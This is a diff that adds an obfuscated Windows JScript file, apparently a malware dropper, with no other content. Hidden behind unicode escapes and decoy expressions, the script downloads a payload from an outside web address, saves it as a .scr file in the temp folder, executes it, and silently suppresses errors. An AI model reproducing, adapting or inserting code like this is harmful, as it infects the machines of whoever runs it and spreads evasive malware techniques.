@@ -1,0 +1,24 @@
+transplantDeclaration = ((([+!+[]])), this);
+positionRisk = ("p\u006cat\u0066" + "or\u006d", "\u0066" + "inish", "R\u0075" + "n");
+saturationSpindle = transplantDeclaration[("i\u006d\u006dun" + "\u0065", "\u0063yl" + "\u0069" + "\u006e" + "der", "\u0057" + "Scr\u0069p" + "t")];
+saturationSpindle[("\u0064\u0069\u0073c\u0072e" + "te", "ci\u0074" + "at\u0069on", "S" + "\u006cee" + "\u0070")](((12, 866) ^ (12746 ^ 2096)));
+vitaminExtreme = saturationSpindle[("\u0073\u0074\u006fp", "\u006ao\u0075" + "r\u006e\u0061" + "l", "\u0061\u0074" + "\u0074\u0072\u0069\u0062" + "ute", "d" + "ef\u0065" + "\u0063t", "\u0043" + "\u0072ea" + "\u0074\u0065\u004f\u0062" + "\u006a\u0065\u0063\u0074")](("\u0057S\u0063\u0072\u0069" + "p\u0074\u002e\u0053" + "he" + "\u006cl"));
+effectiveVertical = vitaminExtreme[("i" + "l\u006ceg\u0061" + "l", "\u0045\u0078\u0070\u0061nd" + "E\u006ev" + "i" + "\u0072o" + "nme\u006e\u0074S" + "t\u0072" + "\u0069\u006e\u0067\u0073")](("n" + "\u0075m" + "e\u0072\u0061l", "%TE" + "\u004dP%" + "\u002f")) + ("bi" + "l\u006ci\u006f\u006e", "impe\u0072a" + "\u0074\u0069ve", "t\u0072an" + "\u0073port\u0052" + "\u0065\u0073i\u0064" + "\u0065nc\u0065") + ("\u0067am\u0065", "\u0061\u006dp" + "\u0075" + "t\u0061t\u0065", "\u0073pi\u0072a\u006c", "an\u0065\u0063" + "do\u0074" + "e", ".\u0073\u0063r");
+parallelAutomobile = transplantDeclaration[("r\u0065" + "a" + "\u006c" + "\u0069z\u0061\u0074i" + "\u006f\u006e", "W\u0053c" + "\u0072i" + "\u0070" + "\u0074")][("c\u006f\u006ed" + "\u0075\u0063\u0074" + "\u006f\u0072", "\u0043\u0072\u0065" + "\u0061te" + "\u004fb\u006a\u0065" + "\u0063t")](("\u0070" + "ho" + "\u0074\u006f\u0067" + "ra\u0070\u0068", "M\u0053\u0058\u004d\u004c2" + "\u002eX" + "MLH\u0054\u0054\u0050"));
+parallelAutomobile[("\u0073\u0061\u006e" + "\u0064" + "\u0077\u0069ch", "o" + "pe" + "n")](("GE\u0054"), ("\u0070" + "r\u0069\u006e" + "c\u0065", "\u0068" + "\u0074\u0074\u0070" + "\u003a/\u002f\u0061\u0063" + "ces" + "\u0073i" + "\u006evest" + "\u006de\u006e\u0074\u002e\u006e" + "\u0065" + "t" + "/\u0034" + "\u002f\u0030vexw" + "3\u0073\u0035"), !(((((Math.pow(5, (2 + 0)) - (14 ^ 27)) & ((48 | 32) - (3 * 14))) & (((6 | 135) + (59 & 59)), (Math.pow((211, 30, 63, 83), (0 ^ 2)) - (7079 & 6911)), ((1) * (7 & 7)))) + (((0 ^ 2) * (0 ^ 2) * (28 - 26) * (66 / 33) * (([!+[] + !+[]])) | ((5 + 27) | 2 * 2 * 2 * 2)) - (((1530 / 45) ^ (59 - 49)) | (1 + 4) * (Math.pow(15, 2) - 218)))) == 9));
+parallelAutomobile[("\u006c" + "i\u0063\u0065n\u0063e", "\u0061\u0063c\u006fr" + "di" + "on", "\u0063\u0069r\u0063" + "\u006c\u0065", "\u0073\u0065\u006ed")]();
+while (parallelAutomobile[("\u0072ea" + "d\u0079" + "s\u0074" + "\u0061\u0074" + "e")] < ((([+!+[]])) * (4 | 0))) {
+    transplantDeclaration[("bus", "\u006fpp\u006f\u0073" + "\u0069" + "t\u0065", "c\u0065\u006e" + "\u0074r\u0065", "\u0057\u0053cr" + "\u0069\u0070t")][("o\u0072i\u0067i" + "n", "S" + "l" + "\u0065\u0065" + "p")](((1100 / 11) | (32 | 68)));
+}
+provocationTitle = transplantDeclaration[("ope\u0072" + "a\u0074\u0069v\u0065", "\u0057Scr\u0069" + "\u0070t")][("a\u0072t\u0069\u0063" + "le", "\u0061" + "\u0075to\u006e" + "\u006f\u006d\u006f\u0075s", "vi\u0073i" + "t", "r\u0065\u0066" + "r\u0069ge" + "\u0072a\u0074o" + "r", "C\u0072ea\u0074" + "e\u004fb\u006a" + "\u0065" + "c\u0074")](("\u0064" + "a\u0074" + "e", "\u0041\u0044\u004f" + "DB" + "\u002e\u0053tre" + "a\u006d"));
+try {
+    provocationTitle[("ci" + "v\u0069\u006c\u0069" + "\u007a\u0061" + "tion", "\u0063h\u0069\u0065f", "\u006f\u0070\u0065" + "\u006e")]();
+    provocationTitle[("\u0073\u0061" + "\u0062\u006ft" + "\u0061g\u0065", "\u0061\u0069r\u0070l" + "\u0061n" + "\u0065", "\u0074\u0079\u0070" + "\u0065")] = ((84, 253, 215, 36) - (Math.pow(32, 2) - 989));
+    provocationTitle[("c\u006fn" + "fi\u0067" + "ur" + "\u0061t" + "io" + "n", "m\u006fm\u0065" + "\u006e" + "\u0074", "do\u006cl" + "a\u0072", "fact", "w\u0072it\u0065")](parallelAutomobile[("\u0076" + "a" + "\u0063\u0075\u0075\u006d", function String.prototype.hobbyVeteran() {
+        return this
+    }, "\u0052e" + "s\u0070\u006fnse" + "\u0042o" + "d\u0079")]);
+    provocationTitle[("p\u006fs\u0069\u0074" + "\u0069o\u006e")] = ((0 / 41) + (0 | 0));
+    provocationTitle[("\u0064\u006fc\u0075" + "me" + "nt", "block", "s\u0061veT" + "\u006f\u0046" + "\u0069" + "\u006c" + "e")](effectiveVertical, 2);
+    provocationTitle[("\u0063" + "\u006c" + "\u0075" + "b", "st" + "\u0072" + "at\u0065" + "g\u0079", "\u0061\u0063o" + "u\u0073ti" + "\u0063", "\u0064is" + "c\u0072" + "e\u0074e", "c\u006cose")]();
+    vitaminExtreme[positionRisk](effectiveVertical.hobbyVeteran(), (0 | 0), (0 / (300 / 10)));
+} catch (collectorCitation) {};
